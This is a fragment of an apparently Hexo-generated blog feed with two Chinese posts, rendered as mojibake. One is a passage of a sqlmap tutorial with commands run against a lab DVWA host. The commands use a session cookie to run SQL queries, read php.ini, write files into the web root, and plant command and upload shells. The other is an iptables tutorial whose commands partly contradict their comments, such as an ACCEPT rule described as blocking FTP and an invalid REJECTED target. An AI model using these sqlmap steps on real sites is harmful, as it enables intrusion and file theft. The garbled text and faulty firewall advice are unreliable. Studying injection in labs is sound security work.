alt="P0gu9K.png"><br>è¿™æ—¶å€™ä¼šåœ¨ç»å¯¹è·¯å¾„ä¸‹å†™å…¥2ä¸ªshellï¼Œä¸€ä¸ªç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œå¦ä¸€ä¸ªæ˜¯ç”¨æ¥ä¸Šä¼ çš„ï¼Œå…¶ä¸­ä¸Šä¼ çš„æ–‡ä»¶åä¸ºtmpujhum.phpï¼Œè¿™ä¸ªä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥å»ä¸Šä¼ å°é©¬ç„¶åè¿æ¥å³å¯ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°admin adminè¿™æ ·çš„æ–‡å­—ï¼Œè¿™æ˜¯sqlmapç”¨æ¥ç¡®è®¤æ˜¯å¦æˆåŠŸå†™è¿›shellçš„æ ‡å¿—ï¼Œåé¢ä¹Ÿä¼šæä¸€ä¸‹ã€‚ä»–è¿™ä¸ªå†™è¿›adminçš„æ–¹å¼æœ‰å¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨sqlmapå†™æ–‡ä»¶çš„æ—¶å€™å°é©¬æ–‡ä»¶ä¼šå‡ºç°ä¹±ç ã€‚çŒœæµ‹æ˜¯å†™æ–‡ä»¶çš„æ–¹å¼å¯¼è‡´äº†æ–‡ä»¶çš„ä¹±ç ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å†™æ–‡ä»¶çš„æ–¹å¼è¦ä¹ˆå°±æ˜¯ASCIIè¦ä¹ˆæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶æµæ–¹å¼å»å®ç°ã€‚</p><h3 id="åˆ©ç”¨sqlmapè¾…åŠ©æ‰‹å·¥æ³¨å…¥"><a href="#åˆ©ç”¨sqlmapè¾…åŠ©æ‰‹å·¥æ³¨å…¥" class="headerlink" title="åˆ©ç”¨sqlmapè¾…åŠ©æ‰‹å·¥æ³¨å…¥"></a>åˆ©ç”¨sqlmapè¾…åŠ©æ‰‹å·¥æ³¨å…¥</h3><p>å…¶å®è¿™ä¸ªå°±æ˜¯ä»‹ç»äº†åœ¨å‘ç°æ³¨å…¥ç‚¹ä¹‹åï¼Œæ€ä¹ˆåœ¨sqlmapé‡Œé¢æ‰§è¡ŒSQLè¯­å¥ï¼Œç»§ç»­ç”¨ä¸Šé¢çš„ä¾‹å­ï¼Œæ”¹ä¸€ä¸‹å°±æ˜¯è¿™æ ·å­çš„ï¼Œä½†å‰ææˆ‘ä»¬ä¹Ÿæ˜¯è¦å‘ç°æ•°æ®ç‚¹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --sql-query "select user(),version(),database()"</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/08/02/P0g3Bd.png" alt="P0g3Bd.png"><br>è¿™æ ·å°±æ˜¯ç›¸å½“äºè¿è¡Œå¯¹åº”çš„SQLè¯­å¥äº†ã€‚ä½†æ˜¯å…¶å®è¿™æ ·æ‰§è¡Œçš„è¯æ¯ä¸€æ¬¡éƒ½ä¼šå¯¹ç½‘ç«™æ³¨å…¥ä¸€éï¼Œæ•ˆç‡å°±æ¯”è¾ƒä½.<br>å¯ä»¥æ¢ä¸€ä¸ªæ–¹å¼ï¼ŒæŠŠ<code>--sql-query</code>æ”¹ä¸º<code>--sql-shell</code>,è¿™æ ·ä¸€æ¥å°±ç›¸å½“äºå¹³å¸¸æˆ‘ä»¬æ‰§è¡ŒSQLè¯­å¥çš„é‚£ä¸ªcmdå‘½ä»¤ç•Œé¢ä¸€æ ·ã€‚å†™ä¸€æ¡è¯­å¥å°±ç›´æ¥æ‰§è¡Œä¸€æ¡ï¼Œçœå»äº†æ³¨å…¥çš„è¿‡ç¨‹ã€‚</p><h3 id="åˆ©ç”¨sqlmapè¿›è¡Œæ–‡ä»¶è¯»å†™"><a href="#åˆ©ç”¨sqlmapè¿›è¡Œæ–‡ä»¶è¯»å†™" class="headerlink" title="åˆ©ç”¨sqlmapè¿›è¡Œæ–‡ä»¶è¯»å†™"></a>åˆ©ç”¨sqlmapè¿›è¡Œæ–‡ä»¶è¯»å†™</h3><p>è¿™é‡Œå¯ä»¥å†™æ–‡ä»¶çš„è¯å‰æå¿…é¡»æœ‰<br>åˆ¤æ–­æ˜¯å¦ä¸º<code>dba/rootç”¨æˆ·</code>ï¼Œçˆ†å‡ºäº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œæœ‰ä¸€ä¸ªå¯å†™ç›®å½•ï¼Œä¹Ÿæ˜¯ç”¨ä¸Šé¢çš„æ¡ˆä¾‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-read=/opt/lampp/htdocs/php.ini</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–äº†<code>php.ini</code>æ–‡ä»¶ï¼Œå¹¶è¿”å›äº†è·¯å¾„ã€‚</p><p><img src="https://s1.ax1x.com/2018/08/02/P0g8HA.png" alt="P0g8HA.png"><br> æ‰“å¼€å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br>      è¿™é‡Œçš„æ–‡ä»¶æˆ‘ä»¬å¯ä»¥å»sqlmapçš„outputé‡Œé¢æŸ¥çœ‹ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„ç”¨æˆ·æ–‡ä»¶å¤¹é‡Œé¢</p><p>åœ¨æœåŠ¡å™¨ç«¯å†™å…¥æ–‡ä»¶<br>      è¾“å…¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://10.1.1.136/vulnerabilities/sqli/?id=1&amp;Submit=Submit" <span class="comment">--cookie="PHPSESSID=q3bm4gupu58dqptm0lve1o12u4; security=low" --file-write C:\1.txt --file-dest /opt/lampp/htdocs/vulnerabilities/exec/1.txt</span></span><br></pre></td></tr></table></figure><p>  è¿™é‡Œçš„æ„æ€å°±æ˜¯å°†æœ¬åœ°<code>C:\1.txt</code> å†™å…¥åˆ°æœåŠ¡å™¨ç«¯<code>/opt/lampp/htdocs/vulnerabilities/exec/1.txt</code></p><p>æ‰“å¼€å¯¹åº”æ–‡ä»¶çš„ç½‘ç«™è·¯å¾„å¦‚ä¸‹å›¾ï¼š<br><img src="https://s1.ax1x.com/2018/08/02/P0gJAI.png" alt="P0gJAI.png">      </p><p>è¿™é‡Œåˆå‡ºç°äº†admin adminäº†ï¼Œå°±æ˜¯sqlmapç”¨æ¥ç¡®è®¤æ˜¯å¦å†™æˆåŠŸçš„æ ‡å¿—ï¼Œå› ä¸ºåœ¨å†™æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ä»–ä¼šé—®æ˜¯å¦éªŒè¯ï¼Œå®ƒå°±ä¼šä»¥è¿™ä¸ªæ ‡å¿—æ¥åˆ¤æ–­å•¦ã€‚</p><p><img src="https://s1.ax1x.com/2018/08/02/P0gYNt.png" alt="P0gYNt.png"></p>]]></content>
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linuxé˜²ç«å¢™å­¦ä¹ </title>
      <link href="/Linux-FW.html"/>
      <url>/Linux-FW.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Linuxä¸‹<code>iptables</code>çš„è®¾ç½®ï¼Œè®¾ç½®äº†å®ƒå°±èƒ½å¤Ÿæœ‰æ•ˆåœ°è¿‡æ»¤æ‰ç›¸å…³çš„æ•°æ®åŒ…ä»è€Œé˜»æŒ¡ç›¸å…³æ”»å‡»ï¼Œæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿è·Ÿå®‰å…¨æœ‰å¾ˆå¤§ç”¨å¤„ï¼Œæ¯”å¦‚åœ¨æˆ‘ä»¬å­¦ä¹ çš„è®¡ç®—æœºç½‘ç»œçŸ¥è¯†é‡Œé¢ï¼Œç½‘ç»œæ‹“æ‰‘ååˆ†ç“œçš®ï¼Œè·¯ç”±å™¨æ²¡æœ‰è¿‡æ»¤æ•°æ®åŒ…çš„åŠŸèƒ½ï¼Œç›´æ¥å°±å®ç°è·¯ç”±è½¬å‘çš„è¿‡ç¨‹ï¼Œè¿™æ ·å°±ä¼šå¯¹ä¸€ä¸ªLANé€ æˆå¾ˆå¤§çš„å®‰å…¨éšæ‚£ï¼Œ<a id="more"></a>ç°åœ¨æˆ‘è¦æ›´æ­£ä¸€ä¸‹è‡ªå·±çš„æ€è·¯ï¼Œè·¯ç”±å™¨ä¸å•å•å®ç°è½¬å‘åŠŸèƒ½ï¼Œæˆ‘ç°åœ¨è¿˜æŠŠä»–çœ‹æˆä¸€å°å¯ä»¥å®ç°è¿‡æ»¤åŠŸèƒ½çš„ç”µè„‘ï¼Œè¿™æ ·å°±å¯¹å®ƒæ‰€è¿æ¥çš„LANæœ‰ä¿æŠ¤ä½œç”¨äº†ï¼Œä½†ç°åœ¨ä¸€èˆ¬å¯¹äºç½‘ç»œé˜²ç«å¢™è€Œè¨€å¾ˆå°‘å†ä½¿ç”¨<code>iptables</code>äº†ï¼Œç°åœ¨ä¸€èˆ¬éƒ½ç”¨ä¸€äº›å¤§å‹å‚å•†æä¾›çš„é˜²ç«å¢™ã€‚æ¯”å¦‚å3ï¼Œæ·±ä¿¡æœä¹‹ç±»çš„ï¼Œè¯´ç™½äº†å°±æ˜¯ç‰›é€¼äº†ä¸€ç‚¹çš„ç”µè„‘ï¼Œä½†æ˜¯å¯¹äºä¸€å°æœåŠ¡å™¨è€Œè¨€è¿˜æ˜¯å¯ä»¥è®¾ç½®è§„åˆ™æ¥é˜²æ­¢åˆ«äººæ‹¿ä¸‹æœåŠ¡å™¨çš„ã€‚</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>netfilter</code>    ï¼šä½äºLinuxå†…æ ¸ä¸­çš„åŒ…è¿‡æ»¤åŠŸèƒ½ä½“ç³»ï¼Œç§°ä¸ºLinuxé˜²ç«å¢™çš„â€œå†…æ ¸æ€â€<br><code>iptables</code>ï¼šä½äº/sbin/iptablesï¼Œç”¨æ¥ç®¡ç†é˜²ç«å¢™è§„åˆ™çš„å·¥å…·ï¼Œç§°ä¸ºLinuxé˜²ç«å¢™çš„â€œç”¨æˆ·æ€â€</p><p>â€”â€” ä¸Šè¿°2ç§ç§°å‘¼éƒ½å¯ä»¥è¡¨ç¤ºLinuxé˜²ç«å¢™<br>å…¶å®ç”¨æˆ·å±‚é¢ä½¿ç”¨iptablesä¹Ÿæ˜¯å»è°ƒç”¨å†…æ ¸é‡Œé¢çš„netfilterï¼Œè¿™æ˜¯æ“ä½œç³»ç»Ÿé‡Œé¢çš„çŸ¥è¯†å°±ä¸å¤šè¯´äº†</p><h3 id="LinuxæŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"><a href="#LinuxæŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€" class="headerlink" title="LinuxæŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"></a>LinuxæŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables start å¯åŠ¨é˜²ç«å¢™</span><br><span class="line">service iptables status æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€æ¡å‘½ä»¤iptables -L --line-numbersæŸ¥çœ‹è¾ƒä¸ºè¯¦ç»†çš„å‘½ä»¤</span><br><span class="line">service iptables stop åœæ­¢æœåŠ¡</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯é˜¿é‡Œäº‘çš„ä¸»æœºå¥½åƒæ²¡æœ‰è¿™ä¸ªæœåŠ¡ï¼Œä»–æ˜¯ç›´æ¥åœ¨ç½‘é¡µä¸Šè®©ä½ è®¾ç½®é˜²ç«å¢™ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±çš„é˜¿é‡Œäº‘ä¸»æœºï¼Œå‘½ä»¤è¡Œç•Œé¢ä¸èƒ½è®¾ç½®ï¼Œä½†æ˜¯åœ¨ç½‘é¡µç«¯å¯å·²è‡ªè¡Œæ§åˆ¶ç«¯å£çš„å¼€æ”¾ä»¥åŠå„ç§è§„åˆ™<br><img src="https://s1.ax1x.com/2018/07/29/Pa5y1f.png" alt="Pa5y1f.png"></p><p><a href="https://imgchr.com/i/Pa5vNR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/Pa5vNR.md.png" alt="Pa5vNR.md.png"></a></p><h3 id="åŒ…è¿‡æ»¤çš„å·¥ä½œå±‚æ¬¡"><a href="#åŒ…è¿‡æ»¤çš„å·¥ä½œå±‚æ¬¡" class="headerlink" title="åŒ…è¿‡æ»¤çš„å·¥ä½œå±‚æ¬¡"></a>åŒ…è¿‡æ»¤çš„å·¥ä½œå±‚æ¬¡</h3><p>ä¸»è¦å®ç°åœ¨ç½‘ç»œå±‚ä¹Ÿå°±æ˜¯å¯¹IPæ•°æ®åŒ…çš„å¤„ç†ä¸Šï¼Œè¯¦ç»†ä¸€ç‚¹å°±æ˜¯å¯¹ipåœ°å€ä»¥åŠç«¯å£åšå¤„ç†<br><a href="https://imgchr.com/i/PaI8Ej" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaI8Ej.md.png" alt="PaI8Ej.md.png"></a></p><p>ä¸‹é¢æ˜¯äº›å…ˆè¡ŒçŸ¥è¯†ï¼Œå…³äºiptablesçš„é“¾è¡¨ç»“æ„</p><h3 id="è§„åˆ™é“¾"><a href="#è§„åˆ™é“¾" class="headerlink" title="è§„åˆ™é“¾"></a>è§„åˆ™é“¾</h3><p>è§„åˆ™çš„ä½œç”¨ï¼šå¯¹æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤æˆ–å¤„ç†<br>é“¾çš„ä½œç”¨ï¼šå®¹çº³å„ç§é˜²ç«å¢™è§„åˆ™<br>é“¾çš„åˆ†ç±»ä¾æ®ï¼šå¤„ç†æ•°æ®åŒ…çš„ä¸åŒæ—¶æœº</p><p>é»˜è®¤åŒ…æ‹¬5ç§è§„åˆ™é“¾<br><code>INPUT</code>ï¼šå¤„ç†å…¥ç«™æ•°æ®åŒ…<br><code>OUTPUT</code>ï¼šå¤„ç†å‡ºç«™æ•°æ®åŒ…<br><code>FORWARD</code>ï¼šå¤„ç†è½¬å‘æ•°æ®åŒ…<br><code>POSTROUTING</code>é“¾ï¼šåœ¨è¿›è¡Œè·¯ç”±é€‰æ‹©åå¤„ç†æ•°æ®åŒ…<br><code>PREROUTING</code>é“¾ï¼šåœ¨è¿›è¡Œè·¯ç”±é€‰æ‹©å‰å¤„ç†æ•°æ®åŒ…</p><p>ä¸Šé¢è¿™5ç§è§„åˆ™ï¼Œåœ¨ç°å®ç”Ÿæ´»ä¸­ä¸€èˆ¬ä¸æ˜¯å…¨éƒ½æ˜¯ä½¿ç”¨</p><h3 id="è§„åˆ™è¡¨"><a href="#è§„åˆ™è¡¨" class="headerlink" title="è§„åˆ™è¡¨"></a>è§„åˆ™è¡¨</h3><p>è¡¨çš„ä½œç”¨ï¼šå®¹çº³å„ç§è§„åˆ™é“¾<br>è¡¨çš„åˆ’åˆ†ä¾æ®ï¼šé˜²ç«å¢™è§„åˆ™çš„ä½œç”¨ç›¸ä¼¼</p><p>é»˜è®¤åŒ…æ‹¬4ä¸ªè§„åˆ™è¡¨<br><code>raw</code>è¡¨ï¼šç¡®å®šæ˜¯å¦å¯¹è¯¥æ•°æ®åŒ…è¿›è¡ŒçŠ¶æ€è·Ÿè¸ª<br><code>mangle</code>è¡¨ï¼šä¸ºæ•°æ®åŒ…è®¾ç½®æ ‡è®°<br><code>nat</code>è¡¨ï¼šä¿®æ”¹æ•°æ®åŒ…ä¸­çš„æºã€ç›®æ ‡IPåœ°å€æˆ–ç«¯å£<br><code>filter</code>è¡¨ï¼šç¡®å®šæ˜¯å¦æ”¾è¡Œè¯¥æ•°æ®åŒ…ï¼ˆè¿‡æ»¤ï¼‰<br>å¸¸ç”¨çš„å°±æ˜¯å…¶ä¸­<strong>filter</strong>è¡¨<strong>nat</strong>è¡¨å¤šç”¨äºå®ç°ipçš„è½¬åŒ–åŠŸèƒ½ï¼Œè¿™é‡Œçš„è¡¨åŠŸèƒ½ä¸ªäººæ„Ÿè§‰ç›¸å½“äºé“¾ä¸‹é¢çš„è¡¨åŠŸèƒ½ï¼Œæ¯ç§é“¾éƒ½å­˜åœ¨è¿™å››ç§è¡¨</p><h3 id="è§„åˆ™è¡¨ä¹‹é—´çš„é»˜è®¤ä¼˜å…ˆçº§"><a href="#è§„åˆ™è¡¨ä¹‹é—´çš„é»˜è®¤ä¼˜å…ˆçº§" class="headerlink" title="è§„åˆ™è¡¨ä¹‹é—´çš„é»˜è®¤ä¼˜å…ˆçº§"></a>è§„åˆ™è¡¨ä¹‹é—´çš„é»˜è®¤ä¼˜å…ˆçº§</h3><p><code>raw&gt;mangle&gt;nat&gt;filter</code><br>è§„åˆ™é“¾ä¹‹é—´çš„é»˜è®¤ä¼˜å…ˆçº§<br>å…¥ç«™ï¼š<code>PREROUTING&gt;INPUT</code><br>å‡ºç«™ï¼š<code>OUTPUT&gt;POSTROUTING</code><br>è½¬å‘ï¼š<code>PREROUTING&gt;FORWARD&gt;POSTROUTING</code><br>è§„åˆ™é“¾å†…çš„åŒ¹é…é¡ºåº<br>æŒ‰é¡ºåºä¾æ¬¡æ£€æŸ¥ï¼ŒåŒ¹é…å³åœæ­¢ï¼ˆLOGç­–ç•¥ä¾‹å¤–ï¼‰<br>è‹¥æ‰¾ä¸åˆ°ç›¸åŒ¹é…çš„è§„åˆ™ï¼Œåˆ™æŒ‰è¯¥é“¾çš„é»˜è®¤ç­–ç•¥å¤„ç†ï¼Œè¿™è·Ÿè·¯ç”±è½¬å‘è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«çš„<br><a href="https://imgchr.com/i/PaIBb4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/29/PaIBb4.md.png" alt="PaIBb4.md.png"></a></p><p>æ•´ä¸ªåŸºæœ¬æµç¨‹å¤§æ¦‚å°±æ˜¯è¿™æ ·ï¼Œåæ­£å§ç°åœ¨çš„ç½‘ç»œç¯å¢ƒä¸€èˆ¬éƒ½æ˜¯åªéœ€è¦å…¶ä¸­çš„ä¸€éƒ¨åˆ†</p><h3 id="å‘½ä»¤å®ç°"><a href="#å‘½ä»¤å®ç°" class="headerlink" title="å‘½ä»¤å®ç°"></a>å‘½ä»¤å®ç°</h3><p>åŸºæœ¬æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables  [-t è¡¨å]  é€‰é¡¹  [é“¾å]  [æ¡ä»¶]  [-j æ§åˆ¶ç±»å‹]</span><br></pre></td></tr></table></figure><p>å‡ ä¸ª<code>æ³¨æ„äº‹é¡¹</code><br>ä¸æŒ‡å®šè¡¨åæ—¶ï¼Œé»˜è®¤æŒ‡filterè¡¨<br>ä¸æŒ‡å®šé“¾åæ—¶ï¼Œé»˜è®¤æŒ‡è¡¨å†…çš„æ‰€æœ‰é“¾<br>é™¤éè®¾ç½®é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œå¦åˆ™å¿…é¡»æŒ‡å®šåŒ¹é…æ¡ä»¶<br>é€‰é¡¹ã€é“¾åã€æ§åˆ¶ç±»å‹ä½¿ç”¨å¤§å†™å­—æ¯ï¼Œå…¶ä½™å‡ä¸ºå°å†™</p><p>æ•°æ®åŒ…çš„å¸¸è§æ§åˆ¶ç±»å‹<br><code>ACCEPT</code>ï¼šå…è®¸é€šè¿‡<br><code>DROP</code>ï¼šç›´æ¥ä¸¢å¼ƒï¼Œä¸ç»™å‡ºä»»ä½•å›åº”<br><code>REJECT</code>ï¼šæ‹’ç»é€šè¿‡ï¼Œå¿…è¦æ—¶ä¼šç»™å‡ºæç¤º<br><code>LOG</code>ï¼šè®°å½•æ—¥å¿—ä¿¡æ¯ï¼Œç„¶åä¼ ç»™ä¸‹ä¸€æ¡è§„åˆ™ç»§ç»­åŒ¹é…</p><p>æ·»åŠ æ–°çš„è§„åˆ™,è¿™é‡Œè€ƒè™‘åˆ°ä»–çš„åŒ¹é…è§„åˆ™å¿…è¦çš„æ—¶å€™éœ€è¦æ¢ä¸€ä¸‹å‘½ä»¤<br><code>-A</code>ï¼šåœ¨é“¾çš„æœ«å°¾è¿½åŠ ä¸€æ¡è§„åˆ™<br><code>-I</code>ï¼šåœ¨é“¾çš„å¼€å¤´ï¼ˆæˆ–æŒ‡å®šåºå·ï¼‰æ’å…¥ä¸€æ¡è§„åˆ™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -A INPUT -p tcp -j ACCEPT   ç›´æ¥åœ¨æœ€ååŠ å…¥è§„åˆ™</span><br><span class="line">iptables -I INPUT 2 -p icmp -j ACCEPT è¿™æ ·å°±æ˜¯åœ¨ç¬¬äºŒæ¡åé¢æ’å…¥è§„åˆ™</span><br></pre></td></tr></table></figure><p>åˆ é™¤ã€æ¸…ç©ºè§„åˆ™<br><code>-D</code>ï¼šåˆ é™¤é“¾å†…æŒ‡å®šåºå·ï¼ˆæˆ–å†…å®¹ï¼‰çš„ä¸€æ¡è§„åˆ™<br><code>-F</code>ï¼šæ¸…ç©ºæ‰€æœ‰çš„è§„åˆ™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> iptables -F  æ¸…ç©ºæ‰€æœ‰è§„åˆ™</span><br><span class="line">iptables -D INPUT 3  åˆ é™¤ç¬¬ä¸‰æ¡è§„åˆ™</span><br></pre></td></tr></table></figure><p>è®¾ç½®é»˜è®¤ç­–ç•¥<br><code>-P</code>ï¼šä¸ºæŒ‡å®šçš„é“¾è®¾ç½®é»˜è®¤è§„åˆ™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P FORWARD DROP  ç»™FORWARDé“¾é»˜è®¤è®¾ç½®DROPè§„åˆ™</span><br></pre></td></tr></table></figure><p>åè®®åŒ¹é…ï¼š<code>-p</code> åè®®å<br>åœ°å€åŒ¹é…ï¼š<code>-s</code> æºåœ°å€ã€<code>-d</code> ç›®çš„åœ°å€<br>æ¥å£åŒ¹é…ï¼š<code>-i</code> å…¥ç«™ç½‘å¡ã€<code>-o</code> å‡ºç«™ç½‘å¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -p ! icmp -j ACCEPT  è¿™æ¡å‘½ä»¤çš„æ„æ€å°±æ˜¯é™¤äº†icmpåè®®ä¹‹å¤–çš„æ‰€æœ‰åè®®éƒ½ACCEPT</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -s 10.20.30.0/24 -j DROP  è¿™æ¡å‘½ä»¤çš„æ„æ€å°±æ˜¯æŠŠæ¥è‡ª10.20.30.0è¿™ä¸€ä¸ªç½‘æ®µçš„åŒ…å…¨éƒ½ä¸¢æ‰ï¼Œæœ‰æ•ˆé˜²æ­¢äº†DDOSæ”»å‡»</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP </span><br><span class="line">iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP</span><br><span class="line">iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸‰æ¡å‘½ä»¤ä¹Ÿå¾ˆæœ‰å®é™…æ„ä¹‰ï¼Œå‡è®¾æœ‰äººæ¶æ„ä¸²æ”¹äº†æºåœ°å€ï¼ŒåŒæ—¶æŠŠè¿™ä¸ªåŒ…å‘é€åˆ°å†…ç½‘ï¼Œå†…ç½‘çš„æœºå­ä¼šå¯¹è¿™ç§åŒ…åšå‡ºå“åº”ï¼Œæ­¤æ—¶æºåœ°å€å˜æˆç›®çš„åœ°å€ï¼Œå°±ä¼šç›´æ¥åœ¨å†…ç½‘é‡Œé¢ä¸€ä¸ªä¸ªå°è¯•å¯¹åº”IPä»è€Œå¯ä»¥æ”»å‡»å†…ç½‘çš„æœºå­ï¼Œå› ä¸ºè¿™ç§æºIPæ˜¯å†…ç½‘åœ°å€çš„æ˜¯ä¸å¯èƒ½å‡ºç°åœ¨äº’è”ç½‘ä¸Šçš„ï¼Œç†æ‰€å½“ç„¶åº”è¯¥ç¦æ­¢</p><p>ç«¯å£åŒ¹é…ï¼š<code>--sport</code>æºç«¯å£ã€<code>--dport</code> ç›®çš„ç«¯å£<br>TCPæ ‡è®°åŒ¹é…ï¼š<code>--tcp-flags</code> æ£€æŸ¥èŒƒå›´ è¢«è®¾ç½®çš„æ ‡è®°<br>ICMPç±»å‹åŒ¹é…ï¼š<code>--icmp-type</code> ICMPç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -s 192.168.4.0/24 -p udp --dport 53 -j ACCEPT   å¯¹äº192.168.4.0è¿™ä¸ªç½‘æ®µçš„DNSæœåŠ¡å¼€å¯åšç›¸åº”è§„åˆ™</span><br><span class="line">iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT ç¦æ­¢FTP</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j DROP</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æˆ‘å‰é¢è®²çš„å¯¹åº”è‡ªå·±pingåˆ«äººå¯æ”¶åˆ°å“åº”æŠ¥æ–‡ï¼Œåˆ«äººå´pingä¸åˆ°ä½ ï¼Œæœ‰æ•ˆé™ä½ä½ è¢«åˆ«äººæ”»å‡»çš„å¯èƒ½</p><p>å†æ¥çœ‹çœ‹ä¸€ä¸ªä¾‹å­<br>è¾“å…¥å‘½ä»¤<code>iptables -t filter -I INPUT -p icmp -j REJECTED</code><br>è¿™æ¡å‘½ä»¤æ˜¯å¯¹è¿›å…¥çš„æ•°æ®åŒ…è¿›è¡Œicmpæ‰€æœ‰åè®®åŒ…è¿›è¡Œè¿‡æ»¤ï¼Œéœ€è¦æ³¨æ„ä¸¤ç‚¹ç¬¬ä¸€ï¼Œæ§åˆ¶ç±»å‹ä¸ä¸€æ ·è¿”å›çš„æ•ˆæœä¹Ÿä¸ä¸€æ ·ï¼Œç¬¬äºŒå¯¹äºicmpè¿™ç§ç±»å‹çš„æŠ¥æ–‡è€Œè¨€ï¼Œå“åº”åŒ…è·Ÿè¯·æ±‚åŒ…éƒ½è¢«æˆªäº†ï¼Œåé¢ä¼šè®²åˆ°å¦‚ä½•å¯ä»¥æ¥å—icmpå“åº”åŒ…è€Œä¸æ¥å—è¯·æ±‚åŒ…<br>ç„¶åå°è¯•pingä¸€ä¸‹å¯¹é¢çš„æœºå­ï¼Œè¿™æ˜¯æ‹’ç»(REJECT)çš„æ•ˆæœ<br><img src="https://s1.ax1x.com/2018/07/29/PaIsa9.png" alt="PaIsa9.png"></p><p>è¿™æ˜¯ç›´æ¥ä¸¢å¼ƒ(DROP)çš„æ•ˆæœ<br><img src="https://s1.ax1x.com/2018/07/29/PaIy5R.png" alt="PaIy5R.png"></p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" 